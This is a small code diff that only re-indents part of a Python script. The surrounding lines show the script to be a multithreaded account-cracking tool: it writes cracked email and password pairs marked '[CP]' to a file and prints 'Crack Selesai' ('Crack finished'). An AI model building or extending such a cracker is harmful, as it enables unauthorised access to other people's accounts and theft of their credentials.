@@ -298,9 +298,9 @@ def main(arg):
                                                                         cek.write('\n   [CP] '+em+' | '+pw8+' | '+bt)
                                                                         cek.close()
                                                                         cekpoint.append(em)
-    except:
-        pass
-    p = ThreadPool(20)
+	except:
+		pass
+	p = ThreadPool(20)
 	p.map(main, id)
 	print ("─────────────────────────────────────────────────────────────")
 	print ("   [•] Crack Selesai")
